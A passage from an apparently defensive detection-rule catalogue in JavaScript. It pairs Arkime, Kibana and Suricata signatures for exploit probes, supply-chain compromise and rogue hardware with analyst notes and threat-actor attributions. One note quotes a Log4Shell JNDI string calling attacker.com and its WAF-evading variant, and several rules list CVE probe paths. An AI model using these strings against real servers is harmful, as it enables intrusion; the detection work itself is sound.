        notes: "Log4Shell injects JNDI lookup strings (\${jndi:ldap://attacker.com/exploit}) into any HTTP header that gets logged - User-Agent, X-Forwarded-For, Referer, Accept-Language, or custom headers. The obfuscated variants (\${\${::-j}\${::-n}\${::-d}\${::-i}:...}) were developed specifically to bypass WAF pattern matching. Despite being disclosed in 2021 this is still actively exploited - unpatched Log4j instances in legacy Java applications remain common. The JNDI lookup triggers an outbound LDAP/RMI connection from your server to adversary infrastructure - monitor for unexpected outbound LDAP (TCP/389, TCP/636) or RMI (TCP/1099) from your web application servers as the follow-on indicator.",
        apt: [
          { cls: "apt-cn", name: "APT41", note: "Weaponized Log4Shell within hours of disclosure for targeted intrusion operations." },
          { cls: "apt-ir", name: "APT33", note: "Exploits Log4Shell against energy sector applications." },
          { cls: "apt-kp", name: "Lazarus", note: "Used Log4Shell in cryptocurrency exchange and financial sector targeting." },
          { cls: "apt-ru", name: "Sandworm", note: "Exploits Log4Shell in operations against Ukrainian and European infrastructure." }
        ],
        cite: "MITRE ATT&CK T1190, CVE-2021-44228, CISA KEV"
      },
      {
        sub: "T1190 - VPN / Appliance CVE",
        indicator: "VPN appliance CVE path probe - known vulnerable endpoint enumeration",
        arkime: `ip.src != $INTERNAL
&& protocols == http
&& http.method == GET
&& http.uri == [
  */dana-na/auth/url_default*
  || */+CSCOE+/logon.html*
  || */remote/fgt_lang*
  || */api/v1/totp/user-backup-code*
  || */vpn/../vpns/cfg/*
  || */__CSCOE__*
  || */dana/html5acc/guacamole*
  || */cgi-bin/pkcs11.cgi*
]`,
        kibana: `NOT source.ip: $INTERNAL
AND http.request.method: GET
AND url.path: (
  *dana-na/auth* OR *CSCOE*
  OR *remote/fgt_lang*
  OR *api/v1/totp/user-backup-code*
  OR *vpn/../vpns/cfg*
  OR *dana/html5acc/guacamole*
  OR *cgi-bin/pkcs11.cgi*
)`,
        suricata: `alert http $EXTERNAL_NET any
  -> $HOME_NET any
  (msg:"TA0001 T1190 VPN appliance
    known CVE path probe";
  flow:established,to_server;
  content:"GET"; http.method;
  pcre:"/(dana-na\\/auth\\/
    url_default|
    \\+CSCOE\\+\\/logon|
    remote\\/fgt_lang|
    api\\/v1\\/totp\\/
    user-backup-code|
    vpn\\/\\.\\.\\/vpns\\/cfg|
    __CSCOE__|
    dana\\/html5acc\\/guacamole|
    cgi-bin\\/pkcs11\\.cgi)/i";
  http.uri;
  classtype:web-application-attack;
  sid:9119006; rev:1;)`,
        notes: "URI signatures for known high-severity VPN CVEs: /dana-na/auth/url_default = Pulse Secure CVE-2019-11510 (unauthenticated file read), /+CSCOE+/logon.html = Cisco ASA CVE-2018-0296, /remote/fgt_lang = FortiOS CVE-2018-13379 (credential disclosure), /api/v1/totp/user-backup-code = Ivanti Connect Secure CVE-2023-35078, /vpn/../vpns/cfg/ = Citrix ADC CVE-2019-19781, /dana/html5acc/guacamole = Pulse Secure CVE-2021-22893, /cgi-bin/pkcs11.cgi = F5 BIG-IP CVE-2021-22986. These paths have no legitimate use - a 200 response to any of these is both a CVE probe success and a critical finding.",
        apt: [
          { cls: "apt-cn", name: "APT40", note: "Exploits Pulse Secure, Citrix, and Fortinet VPN CVEs as primary initial access vectors against government and defense sector targets." },
          { cls: "apt-cn", name: "Volt Typhoon", note: "Exploits VPN appliance vulnerabilities in US critical infrastructure targeting." },
          { cls: "apt-ir", name: "APT33", note: "Exploits FortiOS and Pulse Secure vulnerabilities against energy sector targets." },
          { cls: "apt-ru", name: "APT29", note: "Exploited Pulse Secure CVE-2021-22893 against government and defense targets in 2021." }
        ],
        cite: "MITRE ATT&CK T1190, CISA KEV, CISA advisories"
      },
      {
        sub: "T1190 - Post-Exploit Callback",
        indicator: "Post-exploitation outbound connection from application server - webshell or RCE callback",
        arkime: `ip.src == $DMZ_SERVERS
&& protocols != [
  http || https || dns
  || ntp || syslog
]
&& ip.dst != $INTERNAL
&& ip.dst != $KNOWN_GOOD
&& port.dst == [
  4444 || 1337 || 8888
  || 9999 || 6666 || 443
  || 80 || 8080
]
&& databytes.src > 0
&& databytes.dst > 0`,
        kibana: `source.ip: $DMZ_SERVERS
AND NOT destination.ip: (
  $INTERNAL OR $KNOWN_GOOD
)
AND NOT network.protocol: (
  http OR dns OR ntp
)
AND destination.port: (
  4444 OR 1337 OR 8888
  OR 9999 OR 443 OR 80
  OR 8080 OR 6666
)`,
        suricata: `alert tcp $HTTP_SERVERS any
  -> $EXTERNAL_NET
  [80,443,4444,1337,8080,
   8443,8888,9999,6666]
  (msg:"TA0001 T1190 App server
    unexpected outbound possible
    webshell RCE callback";
  flow:established,to_server;
  content:!"|16 03|"; depth:2;
  content:!"HTTP/"; depth:7;
  threshold:type both,
    track by_src,
    count 1, seconds 60;
  classtype:trojan-activity;
  sid:9119007; rev:1;)`,
        notes: "After successful exploitation via webshell upload or RCE, the compromised application server initiates an outbound connection to the adversary's C2. Application and web servers have no legitimate reason to initiate outbound non-HTTP connections - any raw TCP outbound from a DMZ server to unknown external IPs is a critical finding. Content negation (!|16 03| = not TLS handshake, !'HTTP/' = not HTTP) catches raw shells and non-HTTP C2 on web ports. Immediate response: isolate the server, capture full PCAP, identify the webshell or exploited vulnerability. This is post-exploitation - the initial access has already succeeded.",
        apt: [
          { cls: "apt-cn", name: "APT41", note: "Deploys webshells on compromised application servers that initiate outbound C2 connections, with the outbound callback from the DMZ server being a reliable post-exploitation indicator." },
          { cls: "apt-cn", name: "APT40", note: "Uses webshells and RCE exploitation to establish persistent access to government and defense sector web servers, with post-exploitation C2 visible as unexpected outbound connections." },
          { cls: "apt-ru", name: "Sandworm", note: "Deploys webshells on exploited web servers as a persistence mechanism with outbound C2 callbacks." }
        ],
        cite: "MITRE ATT&CK T1190, T1505.003, CISA advisories"
      },
      {
        sub: "T1190 - Mail Server Exploitation",
        indicator: "ProxyShell / ProxyLogon - Exchange autodiscover and EWS exploit path probing",
        arkime: `ip.src != $INTERNAL
&& protocols == http
&& http.method == [
  GET || POST
  || PROPFIND || MKCOL
]
&& http.uri == [
  */autodiscover/autodiscover.json*
  || */ews/exchange.asmx*
  || */mapi/nspi*
  || */ecp/y.js*
  || */ecp/default.flt*
  || *X-AnonResource-Backend*
  || */owa/auth/x.js*
]
&& ip.dst == $MAIL_SERVERS`,
        kibana: `NOT source.ip: $INTERNAL
AND destination.ip: $MAIL_SERVERS
AND url.path: (
  *autodiscover/autodiscover.json*
  OR *ews/exchange.asmx*
  OR *mapi/nspi*
  OR *ecp/y.js*
  OR *ecp/default.flt*
  OR *owa/auth/x.js*
)`,
        suricata: `alert http $EXTERNAL_NET any
  -> $HOME_NET any
  (msg:"TA0001 T1190 Exchange
    ProxyShell ProxyLogon exploit
    path probe";
  flow:established,to_server;
  pcre:"/(autodiscover\\/
    autodiscover\\.json|
    ews\\/exchange\\.asmx|
    mapi\\/nspi|
    ecp\\/[a-z]{1,3}\\.
    (js|flt|aspx)|
    owa\\/auth\\/[a-z]+\\.js)/i";
  http.uri;
  classtype:web-application-attack;
  sid:9119008; rev:1;)`,
        notes: "ProxyLogon (CVE-2021-26855) uses /autodiscover/autodiscover.json with a Server header to bypass authentication - the X-AnonResource-Backend header is characteristic. ProxyShell (CVE-2021-34473/34523/31207) chains three vulnerabilities via autodiscover.json and EWS to achieve RCE. /ecp/y.js and /ecp/default.flt are characteristic ProxyShell staging paths. /mapi/nspi is used in NTLM relay attacks against Exchange. Any of these paths against your Exchange server from external IPs = immediate P1. Zeek http.log captures all Exchange request paths. Post-exploitation: watch for new files in Exchange inetpub paths and outbound HTTPS from the Exchange server to unknown IPs.",
        apt: [
          { cls: "apt-cn", name: "APT41", note: "Exploited ProxyShell vulnerabilities against multiple sector targets within days of disclosure." },
          { cls: "apt-cn", name: "HAFNIUM", note: "First documented actor to exploit ProxyLogon (CVE-2021-26855) at scale against US defense, law, and infectious disease research organizations." },
          { cls: "apt-ru", name: "Sandworm", note: "Exploited Exchange vulnerabilities in European and government sector targeting." }
        ],
        cite: "MITRE ATT&CK T1190, CVE-2021-26855, CVE-2021-34473, CISA KEV"
      }
    ]
  },
  {
    id: "T1195",
    name: "Supply Chain Compromise",
    desc: ".001 Dependencies · .002 Software · .003 Hardware",
    rows: [
      {
        sub: "T1195.001 - Compromise Software Dependencies",
        indicator: "Build server / CI/CD agent making unexpected outbound connection - dependency exfil or backdoor C2",
        arkime: `ip.src == $BUILD_SERVERS
&& protocols != [
  http || https || dns
  || ntp || git || ldap
  || syslog
]
&& ip.dst != $INTERNAL
&& ip.dst != $KNOWN_PACKAGE_REGISTRIES
&& port.dst == [
  443 || 80 || 8443
  || 4444 || 1337
  || 8080 || 9999
]
&& databytes.src > 0`,
        kibana: `source.ip: $BUILD_SERVERS
AND NOT destination.ip: (
  $INTERNAL OR
  $KNOWN_PACKAGE_REGISTRIES
)
AND destination.port: (
  443 OR 80 OR 8443
  OR 4444 OR 1337
  OR 8080 OR 9999
)
AND source.bytes > 0`,
        suricata: `alert tcp $BUILD_SERVERS any
  -> $EXTERNAL_NET
  [80,443,8443,4444,1337,8080]
  (msg:"TA0001 T1195.001 Build
    server unexpected outbound
    possible dep compromise";
  flow:established,to_server;
  content:!"|16 03|"; depth:2;
  content:!"GET "; depth:5;
  content:!"POST "; depth:6;
  threshold:type both,
    track by_src,
    count 1, seconds 60;
  classtype:trojan-activity;
  sid:9119501; rev:1;)`,
        notes: "Build servers (Jenkins, GitLab CI, GitHub Actions runners, Azure DevOps agents) have predictable network behavior - they pull from package registries (npm, PyPI, Maven, NuGet, Docker Hub) and source repositories, push artifacts to internal storage, and report back to orchestrators. Any outbound connection to non-package-registry destinations is anomalous. Compromised dependencies often beacon out from build agents during the build process - the malicious code runs in the CI environment with full credentials. Maintain $KNOWN_PACKAGE_REGISTRIES allowlist (registry.npmjs.org, pypi.org, maven.apache.org, *.docker.io, hub.docker.com, ghcr.io). Combine with EDR process data - node_modules postinstall scripts and pip install hooks are common compromise points.",
        apt: [
          { cls: "apt-ru", name: "APT29", note: "Compromised the SolarWinds Orion build pipeline to inject SUNBURST malware into legitimate software updates, with the injection occurring during the CI/CD build process." },
          { cls: "apt-kp", name: "Lazarus", note: "Has compromised software supply chains via build infrastructure access in cryptocurrency exchange and software vendor targeting." },
          { cls: "apt-mul", name: "Multi", note: "Build server compromise is documented in multiple CISA and NIST supply chain security advisories as a high-impact attack vector with catastrophic downstream impact." }
        ],
        cite: "MITRE ATT&CK T1195.001, CISA ED-21-01, NIST SP 800-161"
      },
      {
        sub: "T1195.001 - Compromise Software Dependencies",
        indicator: "Typosquatting package fetch - internal host downloading from known typosquat namespace",
        arkime: `ip.src == $INTERNAL
&& protocols == https
&& http.host == [
  *registry.npmjs.org*
  || *pypi.org*
  || *files.pythonhosted.org*
  || *rubygems.org*
  || *crates.io*
]
&& http.uri == [
  *@*/-/* || */packages/*
  || */simple/* || */gems/*
]
&& http.uri == $KNOWN_TYPOSQUAT_PACKAGES`,
        kibana: `source.ip: $INTERNAL
AND url.domain: (
  *registry.npmjs.org*
  OR *pypi.org*
  OR *files.pythonhosted.org*
  OR *rubygems.org*
  OR *crates.io*
)
AND url.path: $KNOWN_TYPOSQUAT_PACKAGES`,
        suricata: `alert http $HOME_NET any
  -> $EXTERNAL_NET 443
  (msg:"TA0001 T1195.001 Known
    typosquat package fetch from
    public registry";
  flow:established,to_server;
  pcre:"/Host:\\s*(registry\\.
    npmjs\\.org|pypi\\.org|
    files\\.pythonhosted\\.org|
    rubygems\\.org|
    crates\\.io)/i";
  http.header;
  classtype:trojan-activity;
  sid:9119502; rev:1;)`,
        notes: "Typosquatting packages mimic legitimate names (reqests vs requests, electrn vs electron, lodahs vs lodash, colors-js vs colors.js). Maintain a $KNOWN_TYPOSQUAT_PACKAGES feed from threat intel sources (Snyk, Socket.dev, GitHub Advisory Database). Match against URL paths - npm uses /package-name/-/package-name-version.tgz, PyPI uses /packages/source/[hash]/[package-name]-[version].tar.gz. Also detect newly published packages that match high-target package name patterns. Internal package mirroring (Artifactory, Nexus) significantly reduces this risk - direct fetches from public registries by developer machines is the primary attack surface.",
        apt: [
          { cls: "apt-kp", name: "Lazarus", note: "Has published typosquatting npm packages targeting cryptocurrency and blockchain developers." },
          { cls: "apt-kp", name: "Moonstone Sleet", note: "Published malicious packages to npm registry targeting blockchain and cryptocurrency development organizations." },
          { cls: "apt-mul", name: "Multi", note: "Typosquatting attacks against npm and PyPI are documented as a constant ongoing campaign with hundreds of malicious packages identified per month." }
        ],
        cite: "MITRE ATT&CK T1195.001, industry reporting"
      },
      {
        sub: "T1195.001 - Compromise Software Dependencies",
        indicator: "Dependency confusion - internal package name fetched from public registry",
        arkime: `ip.src == $INTERNAL
&& protocols == https
&& http.host == [
  *registry.npmjs.org*
  || *pypi.org*
]
&& http.uri == $INTERNAL_PACKAGE_NAMES
&& ip.dst != $INTERNAL_REGISTRY`,
        kibana: `source.ip: $INTERNAL
AND url.domain: (
  *registry.npmjs.org*
  OR *pypi.org*
)
AND url.path: $INTERNAL_PACKAGE_NAMES
AND NOT destination.ip: $INTERNAL_REGISTRY`,
        suricata: `alert http $HOME_NET any
  -> $EXTERNAL_NET 443
  (msg:"TA0001 T1195.001 Internal
    package name fetched from
    public registry dep confusion";
  flow:established,to_server;
  content:"GET"; http.method;
  pcre:"/Host:\\s*(registry\\.
    npmjs\\.org|pypi\\.org)/i";
  http.header;
  classtype:trojan-activity;
  sid:9119503; rev:1;)`,
        notes: "Dependency confusion (Alex Birsan 2021) attack: adversary publishes a package on a public registry using the name of an internal-only package - when the build system resolves dependencies, the higher version on the public registry is preferred over the internal one. Detection: maintain a list of your internal package names ($INTERNAL_PACKAGE_NAMES) and alert when those names are fetched from public registries. The fetch should always be from your internal registry (Artifactory, Nexus, Verdaccio). Configure package managers with explicit registry pinning (.npmrc, pip.conf) to prevent the public lookup from happening at all.",
        apt: [
          { cls: "apt-mul", name: "Multi", note: "Dependency confusion attacks have been documented against major technology companies including Apple, Microsoft, Tesla, PayPal, Uber, and Yelp. The technique is widely exploited by both criminal actors and security researchers." }
        ],
        cite: "MITRE ATT&CK T1195.001, industry reporting"
      },
      {
        sub: "T1195.002 - Compromise Software Supply Chain",
        indicator: "Software updater connecting to non-vendor C2 infrastructure - Trojanized update detection",
        arkime: `ip.src == $INTERNAL
&& protocols != [
  http || https || dns
]
&& ip.dst != $VENDOR_UPDATE_INFRA
&& port.dst == [
  443 || 80 || 8080 || 8443
]
&& process == [
  *update* || *agent*
  || *service* || *daemon*
]
&& databytes.src > 0
&& databytes.dst > 0`,
        kibana: `source.ip: $INTERNAL
AND NOT destination.ip:
  $VENDOR_UPDATE_INFRA
AND destination.port: (
  443 OR 80 OR 8080 OR 8443
)
AND process.name: (
  *update* OR *agent*
  OR *service* OR *daemon*
)`,
        suricata: `alert tcp $HOME_NET any
  -> $EXTERNAL_NET
  [80,443,8080,8443]
  (msg:"TA0001 T1195.002 Software
    updater outbound to non-vendor
    infrastructure";
  flow:established,to_server;
  content:!"|16 03|"; depth:2;
  threshold:type both,
    track by_src,
    count 1, seconds 60;
  classtype:trojan-activity;
  sid:9119504; rev:1;)`,
        notes: "Trojanized software updates (SolarWinds Orion, 3CX desktop client, MOVEit Transfer, Asus Live Update) generate post-install C2 connections to adversary-controlled infrastructure. Network signal: a known software updater process making outbound connections to IPs/domains that aren't part of the vendor's known infrastructure. Requires EDR process correlation to identify the source process. Maintain a $VENDOR_UPDATE_INFRA allowlist of legitimate update server IPs/domains for installed software (avsvmcloud.com domain pattern was the SUNBURST signal). Anomalous beaconing patterns from updaters - sleep + jitter, low data volume - are characteristic of supply chain backdoors waiting for activation.",
        apt: [
          { cls: "apt-ru", name: "APT29", note: "Compromised SolarWinds Orion software updates with SUNBURST/SUPERNOVA backdoors, with infected updates beaconing to avsvmcloud.com infrastructure." },
          { cls: "apt-kp", name: "Lazarus", note: "Compromised the 3CX desktop client supply chain in 2023, with infected installations beaconing to adversary infrastructure." },
          { cls: "apt-cn", name: "APT41", note: "Documented compromising software supply chains in technology and gaming sector targeting." }
        ],
        cite: "MITRE ATT&CK T1195.002, CISA ED-21-01, Microsoft MSTIC"
      },
      {
        sub: "T1195.002 - Compromise Software Supply Chain",
        indicator: "Anomalous DNS query from updater process - DGA or sandbox evasion behavior",
        arkime: `ip.src == $INTERNAL
&& protocols == dns
&& dns.query-type == [A || AAAA]
&& dns.host == [
  *avsvmcloud.com*
  || *.appsync-api.*
  || $KNOWN_C2_DOMAINS
]
|| dns.host =~ /^[a-z0-9]{16,}\\.
  (com|net|org|info)$/
&& process == [
  *update* || *agent*
]`,
        kibana: `source.ip: $INTERNAL
AND dns.question.type:
  ("A" OR "AAAA")
AND dns.question.name: (
  *avsvmcloud.com*
  OR *appsync-api*
  OR /[a-z0-9]{16,}\\.com/
)`,
        suricata: `alert dns $HOME_NET any
  -> any 53
  (msg:"TA0001 T1195.002 Anomalous
    DNS from updater DGA or
    backdoor lookup";
  flow:stateless;
  dns.query;
  pcre:"/^[a-z0-9]{16,}\\.
    (com|net|org|info|us|biz)$/";
  classtype:trojan-activity;
  sid:9119505; rev:1;)`,
        notes: "Supply chain backdoors often use DGA (Domain Generation Algorithms) or hardcoded callback domains for C2. SUNBURST used DGA-style subdomains under avsvmcloud.com - the algorithm hashed the victim's domain and encoded it in the subdomain. Generic DGA detection: long alphanumeric subdomains (16+ chars) on common TLDs are statistically rare in legitimate traffic. Combine with process correlation - DGA queries from update.exe, javaupdate.exe, or vendor-named processes are high-confidence. Zeek dns.log captures all queries; build entropy-based detection on subdomain string patterns. SUNBURST specifically used a DGA that produced 16-32 character subdomains encoding the victim's AD domain.",
        apt: [
          { cls: "apt-ru", name: "APT29", note: "SUNBURST malware used DGA-style domain generation under avsvmcloud.com to encode victim domain identifiers in C2 lookups, allowing the adversary to identify high-value victims among the 18,000 SolarWinds customers exposed." },
          { cls: "apt-mul", name: "Multi", note: "DNS-based DGA detection is documented in NSA and CISA threat hunting guidance." }
        ],
        cite: "MITRE ATT&CK T1195.002, T1568.002, CISA ED-21-01"
      },
      {
        sub: "T1195.002 - Compromise Software Supply Chain",
        indicator: "HTTPS beacon with anomalous JA4 from established software process - supply chain implant",
        arkime: `ip.src == $INTERNAL
&& protocols == tls
&& tls.ja4 != $KNOWN_GOOD_CLIENTS
&& tls.ja4 != $BROWSER_JA4
&& process == [
  *update* || *agent*
  || *service* || *.exe*
]
&& port.dst == 443
&& packets.src > 5
&& packets.src < 50`,
        kibana: `source.ip: $INTERNAL
AND destination.port: 443
AND NOT tls.client.ja4: (
  $KNOWN_GOOD_CLIENTS
  OR $BROWSER_JA4
)
AND network.packets: [5 TO 50]`,
        suricata: `alert tls $HOME_NET any
  -> $EXTERNAL_NET 443
  (msg:"TA0001 T1195.002 Anomalous
    JA4 from non-browser process
    supply chain beacon";
  flow:established,to_server;
  ja3.hash;
  threshold:type both,
    track by_src,
    count 5, seconds 600;
  classtype:trojan-activity;
  sid:9119506; rev:1;)`,
        notes: "Supply chain implants embedded in legitimate software typically use bespoke TLS stacks (custom HTTP libraries, Go's net/http, .NET HttpClient with custom config) that produce distinctive JA4 fingerprints unlike legitimate vendor software. Build a JA4 baseline for known-good clients in your environment - vendor software JA4 hashes are stable across versions. Implants generate JA4s outside this baseline. Pair with low-volume periodic beacon patterns (5-50 packets per session, regular intervals) to identify dormant or check-in beacons typical of supply chain implants waiting for activation. Periodicity analysis at sessions level: beacon intervals of 60s, 300s, 3600s with low jitter are characteristic.",
        apt: [
          { cls: "apt-ru", name: "APT29", note: "SUNBURST implant used custom HTTP library generating distinctive JA3/JA4 fingerprints from infected SolarWinds Orion processes." },
          { cls: "apt-kp", name: "Lazarus", note: "3CX supply chain compromise generated anomalous JA4 from desktop client processes." },
          { cls: "apt-mul", name: "Multi", note: "JA4 fingerprinting of supply chain implants is documented in industry threat intelligence reports as a reliable detection method even when the implant is embedded in legitimate-appearing software." }
        ],
        cite: "MITRE ATT&CK T1195.002, industry reporting"
      },
      {
        sub: "T1195.003 - Compromise Hardware Supply Chain",
        indicator: "Hardware management interface phoning home to non-vendor infrastructure - IPMI/iLO/iDRAC backdoor",
        arkime: `ip.src == $MGMT_INTERFACE_IPS
&& protocols != [
  http || https || dns
  || ntp || syslog
  || snmp
]
&& ip.dst != $VENDOR_INFRA
&& ip.dst != $INTERNAL
&& port.dst == [
  443 || 80 || 8443
  || 4444 || 6666
]`,
        kibana: `source.ip: $MGMT_INTERFACE_IPS
AND NOT destination.ip: (
  $VENDOR_INFRA OR $INTERNAL
)
AND destination.port: (
  443 OR 80 OR 8443
  OR 4444 OR 6666
)`,
        suricata: `alert tcp $MGMT_INTERFACE_IPS any
  -> $EXTERNAL_NET
  [80,443,8443,4444,6666]
  (msg:"TA0001 T1195.003 Hardware
    mgmt interface outbound to
    non-vendor infrastructure";
  flow:established,to_server;
  threshold:type both,
    track by_src,
    count 1, seconds 60;
  classtype:trojan-activity;
  sid:9119507; rev:1;)`,
        notes: "Hardware management interfaces (IPMI, iLO, iDRAC, BMC) operate below the OS - they have their own network stack, IP address, and TLS implementation. A compromised BMC can persist across OS reinstalls and is invisible to host-based security tools. Network detection is the only reliable signal for BMC-level compromise. Maintain a separate VLAN for BMC interfaces ($MGMT_INTERFACE_IPS) and alert on any outbound connection from those IPs to non-vendor infrastructure. Legitimate BMC outbound: vendor health monitoring, firmware update servers, NTP, syslog. Anything else from a BMC = critical investigation. Hardware supply chain attacks against BMCs are documented (Bloomberg's 'The Big Hack' allegations 2018, multiple academic demonstrations of malicious BMC firmware).",
        apt: [
          { cls: "apt-cn", name: "APT41", note: "Has been associated with hardware-level operations against technology sector supply chains." },
          { cls: "apt-mul", name: "Multi", note: "Hardware supply chain compromise targeting BMCs and management interfaces is documented in academic security research and vendor advisories. While direct nation-state attribution is limited in public reporting, the technical capability is well-documented and the attack surface is significant." }
        ],
        cite: "MITRE ATT&CK T1195.003, industry reporting"
      }
    ]
  },
  {
    id: "T1200",
    name: "Hardware Additions",
    desc: "Rogue devices · USB-Ethernet · network implants · rogue Wi-Fi APs",
    rows: [
      {
        sub: "T1200 - DHCP Anomalies",
        indicator: "DHCP request from unknown MAC OUI - new device joining network from unauthorized vendor",
        arkime: `ip.src == 0.0.0.0
&& protocols == dhcp
&& port.dst == 67
&& dhcp.message-type == [
  DISCOVER || REQUEST
]
&& mac.src.oui != $KNOWN_OUIS`,
        kibana: `network.protocol: dhcp
AND destination.port: 67
AND dhcp.op: 1
AND NOT source.mac:
  $APPROVED_OUI_PREFIXES`,
        suricata: `alert udp 0.0.0.0 68
  -> 255.255.255.255 67
  (msg:"TA0001 T1200 DHCP from
    unknown MAC OUI possible
    rogue device";
  content:"|01 01 06 00|"; depth:4;
  content:"|63 82 53 63|"; offset:236;
  classtype:policy-violation;
  sid:9120001; rev:1;)`,
        notes: "DHCP DISCOVER/REQUEST messages contain the client MAC address - the first 3 octets (OUI) identify the hardware vendor. Maintain $APPROVED_OUI_PREFIXES allowlist of OUIs from your approved hardware (Dell, HP, Lenovo, Apple, your IP phone vendor, your printer vendor). Hardware additions often use distinctive OUIs: Hak5 devices commonly use Realtek (00:13:37 customizations), Raspberry Pi uses B8:27:EB / DC:A6:32 / E4:5F:01, common rogue device chipsets include MediaTek and Realtek consumer wireless. New OUIs appearing in DHCP traffic = unaudited device on network. Zeek dhcp.log captures full DHCP transaction including client identifier, hostname, and parameter requests.",
        apt: [
          { cls: "apt-ru", name: "Sandworm", note: "Has used hardware implants in operations targeting Ukrainian critical infrastructure, deploying network devices to bridge air-gapped or segmented networks." },
          { cls: "apt-mul", name: "Insider", note: "Hardware addition is documented as a primary insider threat vector in CISA and NSA advisories on physical security." },
          { cls: "apt-mul", name: "Multi", note: "The technique requires physical access and is most commonly observed in insider threat scenarios, close-access operations against high-value targets, and supply-chain interdiction." }
        ],
        cite: "MITRE ATT&CK T1200, CISA advisories, NSA insider threat guidance"
      },
      {
        sub: "T1200 - Switch Port Anomalies",
        indicator: "Multiple MACs from same switch port - rogue switch or hub introduced",
        arkime: `protocols == arp
&& mac.src groupby count > 3
  per-switchport
&& timeframe == 60s`,
        kibana: `network.protocol: arp
AND switch.port: *
AND _exists_: source.mac`,
        suricata: `alert arp $HOME_NET any
  -> any any
  (msg:"TA0001 T1200 Multiple MACs
    on switch port possible rogue
    switch or implant";
  content:"|00 01|"; offset:0;
  depth:2;
  threshold:type both,
    track by_src,
    count 3, seconds 60;
  classtype:policy-violation;
  sid:9120002; rev:1;)`,
        notes: "A switch port should typically see one MAC address (the connected endpoint). Multiple MACs on a single port indicate either an unauthorized switch/hub introduced to expand connectivity, a network implant in transparent bridging mode (LAN Turtle, Packet Squirrel), or a virtualization host with bridged VMs. Detection requires switch port-MAC table data - pull this from your switches via SNMP, NetFlow with switch metadata, or 802.1X/MAC port security logs. Modern enterprise switches support 802.1X with single-MAC enforcement and MAC sticky learning - alert on 'secure port violation' SNMP traps. Most reliable detection comes from switch infrastructure rather than passive packet capture.",
        apt: [
          { cls: "apt-mul", name: "Insider", note: "Rogue switches and bridges introduced for network expansion are documented in penetration testing reports as a common physical security finding." },
          { cls: "apt-mul", name: "Multi", note: "Hak5 LAN Turtle and similar devices operate in transparent bridge mode, generating multiple-MAC-per-port signals. NSA and CISA physical security guidance documents network segmentation with port-level enforcement as the primary mitigation." }
        ],
        cite: "MITRE ATT&CK T1200, NSA physical security guidance"
      },
      {
        sub: "T1200 - Network Implants",
        indicator: "Reverse SSH / persistent outbound connection from network device subnet - implant phone-home",
        arkime: `ip.src == $USER_VLAN
|| ip.src == $PRINTER_VLAN
&& protocols == ssh
&& port.dst == 22
|| port.dst == [
  443 || 8443 || 80
]
&& ip.dst != $INTERNAL
&& packets.src > 10
&& session.duration > 300`,
        kibana: `source.ip: ($USER_VLAN OR $PRINTER_VLAN)
AND NOT destination.ip: $INTERNAL
AND destination.port: (
  22 OR 443 OR 8443
  OR 80 OR 2222
)
AND event.duration > 300000000`,
        suricata: `alert tcp $HOME_NET any
  -> $EXTERNAL_NET
  [22,80,443,2222,8443]
  (msg:"TA0001 T1200 Long-lived
    outbound from device VLAN
    possible implant phone home";
  flow:established,to_server;
  threshold:type both,
    track by_src,
    count 1, seconds 300;
  classtype:trojan-activity;
  sid:9120003; rev:1;)`,
        notes: "Network implants (LAN Turtle, Packet Squirrel) typically establish a persistent reverse SSH tunnel to adversary infrastructure for command and control. The connection is long-lived (hours to days), originates from a host VLAN that shouldn't be making outbound SSH connections, and uses port 22, 443, 2222, or another common port. Most enterprise printers, IoT devices, and end-user workstations have no legitimate reason to initiate outbound SSH. Build per-VLAN baselines: which subnets should/shouldn't initiate which protocols outbound. Long session duration (5+ minutes) plus low data volume = classic beacon/tunnel pattern. Pair with EDR if available to identify the source process - implants don't run on the host, so EDR on the host won't show the process.",
        apt: [
          { cls: "apt-ru", name: "Sandworm", note: "Has used custom hardware implants in operations against Ukrainian infrastructure for persistent network access." },
          { cls: "apt-mul", name: "Insider", note: "Long-lived outbound connections from non-administrative VLANs are documented in CISA and NSA defensive guidance as a high-priority detection pattern." },
          { cls: "apt-mul", name: "Multi", note: "Network implants providing reverse SSH tunnels are extensively documented in offensive security tooling (Hak5 LAN Turtle, Packet Squirrel, Plunder Bug)." }
        ],
        cite: "MITRE ATT&CK T1200, T1572, industry reporting"
      },
      {
        sub: "T1200 - USB-Ethernet",
        indicator: "USB-connected network adapter / Bash Bunny - host generating DHCP from new MAC immediately after USB event",
        arkime: `ip.src == 0.0.0.0
&& protocols == dhcp
&& dhcp.message-type == DISCOVER
&& mac.src != $REGISTERED_HOST_MAC
&& mac.src.oui == [
  *Realtek* || *Microchip*
  || *ASIX*
]
&& source-host == $KNOWN_HOST`,
        kibana: `network.protocol: dhcp
AND dhcp.op: 1
AND source.mac.vendor: (
  Realtek OR Microchip
  OR ASIX OR "ProCurve Networking"
)
AND host.name: $KNOWN_HOSTS`,
        suricata: `alert udp 0.0.0.0 68
  -> 255.255.255.255 67
  (msg:"TA0001 T1200 DHCP from
    USB-Ethernet OUI on host
    possible Bash Bunny";
  content:"|01 01 06 00|"; depth:4;
  content:"|63 82 53 63|"; offset:236;
  classtype:policy-violation;
  sid:9120004; rev:1;)`,
        notes: "Bash Bunny, Rubber Ducky with Ethernet payload, and other malicious USB devices register as USB Ethernet adapters with the host OS - generating a NEW DHCP request from a new MAC address while the host's primary MAC continues to operate normally. The new MAC OUI typically points to common USB Ethernet chipsets (Realtek RTL8152, ASIX AX88179, Microchip LAN9512). Detection: a host generating multiple concurrent DHCP requests from different MACs is anomalous - primary NIC plus USB-Ethernet adapter. Pair with USB device logs (Windows Event 6416, USB device telemetry from EDR) for definitive correlation. Most enterprise environments should disable USB Ethernet/storage entirely via Group Policy or device control software.",
        apt: [
          { cls: "apt-mul", name: "Insider", note: "Hak5 Bash Bunny and similar USB attack platforms are documented offensive security tooling commonly observed in physical penetration tests and insider threat scenarios." },
          { cls: "apt-mul", name: "Multi", note: "USB-attached network adapters are a documented physical attack vector in CISA and NSA insider threat guidance. The devices register as USB Ethernet adapters, generating distinctive DHCP traffic from common USB-Ethernet chipset OUIs (Realtek, ASIX, Microchip)." }
        ],
        cite: "MITRE ATT&CK T1200, T1091, NSA insider threat guidance"
      },
      {
        sub: "T1200 - Rogue Wi-Fi",
        indicator: "Rogue access point - beaconing SSID matching corporate name from unauthorized BSSID",
        arkime: `protocols == 802.11
&& wifi.frame-type == BEACON
&& wifi.ssid == $CORP_SSIDS
&& wifi.bssid != $AUTHORIZED_BSSIDS`,
        kibana: `network.protocol: "802.11"
AND wireless.ssid: $CORP_SSIDS
AND NOT wireless.bssid:
  $AUTHORIZED_BSSIDS`,
        suricata: `alert udp any any
  -> any any
